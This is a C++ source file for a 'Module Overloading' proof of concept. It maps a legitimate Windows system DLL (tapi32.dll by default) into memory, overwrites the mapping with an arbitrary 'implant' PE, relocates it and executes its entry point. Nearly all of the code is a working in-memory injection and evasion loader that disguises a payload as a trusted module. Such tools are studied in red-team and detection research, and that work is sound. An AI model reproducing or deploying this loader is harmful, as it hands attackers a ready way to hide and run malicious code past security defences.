#include <Windows.h>
#include <iostream>

#include <peconv.h>
#include "ntddk.h"
#include "util.h"

//enable it if you want to do a classic DLL hollowing instead:
//#define CLASSIC_HOLLOWING

PVOID map_dll_image(const char* dll_name)
{
	HANDLE hFile = CreateFileA(dll_name,
		GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
		std::cerr << "Couldn't open the file!" << std::hex << hFile << std::endl;
		return NULL;
	}
	std::cout << "File created, handle: " << std::hex << hFile << std::endl;

	HANDLE hSection = nullptr;
	NTSTATUS status = NtCreateSection(&hSection,
		SECTION_ALL_ACCESS,
		NULL,
		0,
		PAGE_READONLY,
		SEC_IMAGE,
		hFile
	);
	bool is_ok = false;
	if (status != STATUS_SUCCESS) {
		std::cerr << "NtCreateSection failed" << std::endl;
	}
	else {
		std::cerr << "NtCreateSection created at:" << std::hex << hSection << std::endl;
		is_ok = true;
	}

	CloseHandle(hFile);
	if (!is_ok) {
		return NULL;
	}

	DWORD protect = PAGE_EXECUTE_READWRITE;
	PVOID sectionBaseAddress = NULL;
	SIZE_T viewSize = 0;
	SECTION_INHERIT inheritDisposition = ViewShare; //VIEW_SHARE
	if ((status = NtMapViewOfSection(hSection,
		NtCurrentProcess(),
		&sectionBaseAddress,
		NULL,
		NULL,
		NULL,
		&viewSize,
		inheritDisposition,
		NULL,
		protect)
		) != STATUS_SUCCESS)
	{
		std::wcout << "[ERROR] NtMapViewOfSection failed, status : " << std::hex << status << "\n";
	}
	else {
		std::wcout << "Section BaseAddress: " << std::hex << sectionBaseAddress << "\n";
		is_ok = true;
	}
	return sectionBaseAddress;
}

PVOID load_target_dll(const char* dll_name)
{
#ifdef CLASSIC_HOLLOWING
	std::cout << "[*] Loading the DLL...\n";
	return LoadLibraryA(dll_name);
#else
	std::cout << "[*] Mapping the DLL image...\n";
	return map_dll_image(dll_name);
#endif
}

bool set_sections_access(PVOID mapped, BYTE* implant_dll, size_t implant_size)
{
	DWORD oldProtect = 0;
	// protect PE header
	if (!VirtualProtect((LPVOID)mapped, PAGE_SIZE, PAGE_READONLY, &oldProtect)) return false;

	bool is_ok = true;
	//protect sections:
	size_t count = peconv::get_sections_count(implant_dll, implant_size);
	for (size_t i = 0; i < count; i++) {
		IMAGE_SECTION_HEADER *next_sec = peconv::get_section_hdr(implant_dll, implant_size, i);
		if (!next_sec) break;
		DWORD sec_protect = translate_protect(next_sec->Characteristics);
		DWORD sec_offset = next_sec->VirtualAddress;
		DWORD sec_size = next_sec->Misc.VirtualSize;
		if (!VirtualProtect((LPVOID)((ULONG_PTR)mapped + sec_offset), sec_size, sec_protect, &oldProtect)) is_ok = false;
	}
	return is_ok;
}

bool overwrite_mapping(PVOID mapped, BYTE* implant_dll, size_t implant_size)
{
	HANDLE hProcess = GetCurrentProcess();
	bool is_ok = false;
	DWORD oldProtect = 0;

	//cleanup previous module:
	size_t prev_size = peconv::get_image_size((BYTE*)mapped);

	if (prev_size) {
		if (!VirtualProtect((LPVOID)mapped, prev_size, PAGE_READWRITE, &oldProtect)) return false;
		memset(mapped, 0, prev_size);
		if (!VirtualProtect((LPVOID)mapped, prev_size, PAGE_READONLY, &oldProtect)) return false;
	}

	if (!VirtualProtect((LPVOID)mapped, implant_size, PAGE_READWRITE, &oldProtect)) {
		if (implant_size > prev_size) {
			std::cout << "[-] The implant is too big for the target!\n";
		}
		return false;
	}
	memcpy(mapped, implant_dll, implant_size);
	is_ok = true;

	// set access:
	if (!set_sections_access(mapped, implant_dll, implant_size)) {
		is_ok = false;
	}
	return is_ok;
}

void run_implant(PVOID mapped, DWORD ep_rva, bool is_dll)
{
	ULONG_PTR implant_ep = (ULONG_PTR)mapped + ep_rva;

	std::cout << "[*] Executing Implant's Entry Point: " << std::hex << implant_ep << "\n";
	if (is_dll) {
		//run the implant as a DLL:
		BOOL(*dll_main)(HINSTANCE, DWORD, LPVOID) = (BOOL(*)(HINSTANCE, DWORD, LPVOID))(implant_ep);
		dll_main((HINSTANCE)mapped, DLL_PROCESS_ATTACH, 0);
	}
	else {
		//run the implant as EXE:
		BOOL(*exe_main)(void) = (BOOL(*)(void))(implant_ep);
		exe_main();
	}
}

int main(int argc, char *argv[])
{
	if (argc < 2) {
		std::cout << 
			"/***************************************************************************\n"
			"Module Overloading (PoC)\nmore info: https://github.com/hasherezade/module_overloading\n"
			"Args: <payload_dll> [target_dll]\n"
			"\t<payload_dll> - the DLL that will be impanted\n"
			"\t[target_dll] - the DLL that will be replaced (default: tapi32.dll)\n"
			"***************************************************************************/\n"
			<< std::endl;
		system("pause");
		return 0;
	}

	char target_dll[MAX_PATH] = { 0 };
	ExpandEnvironmentStringsA("%SystemRoot%\\system32\\tapi32.dll", target_dll, MAX_PATH);

	const char* dll_name = target_dll;
	if (argc > 2) {
		dll_name = argv[2];
	}

	const char* implant_name = argv[1];

	std::cout << "target_dll: " << dll_name << "\n";
	std::cout << "implant_dll: " << implant_name << "\n";

	PVOID mapped = load_target_dll(dll_name);
	if (!mapped) {
		system("pause");
		return -1;
	}
	std::cerr << "[*] Loading the implant...\n";
	size_t v_size = 0;
	BYTE* implant_dll = peconv::load_pe_executable(implant_name, v_size);
	if (!implant_dll) {
		std::cerr << "[-] Failed to load the implant!\n";
		system("pause");
		return -1;
	}
	std::cerr << "[+] Implant loaded\n";
	if (!is_compatibile(implant_dll)) {
		system("pause");
		return -1;
	}

	//relocate the module to the target base:
	if (!peconv::relocate_module(implant_dll, v_size, (ULONGLONG)mapped, (ULONGLONG)implant_dll)) {
		std::cerr << "[-] Failed to relocate the implant!\n";
		system("pause");
		return -1;
	}
	std::cout << "[*] Trying to overwrite the mapped DLL with the implant!\n";
	if (!overwrite_mapping(mapped, implant_dll, v_size)) {
		system("pause");
		return -1;
	}
	std::cout << "[+] Copied!\n";
	DWORD ep_rva = peconv::get_entry_point_rva(implant_dll);
	bool is_dll = peconv::is_module_dll(implant_dll);

	peconv::free_pe_buffer(implant_dll); implant_dll = NULL;

	run_implant(mapped, ep_rva, is_dll);

	system("pause");
	return 0;
}
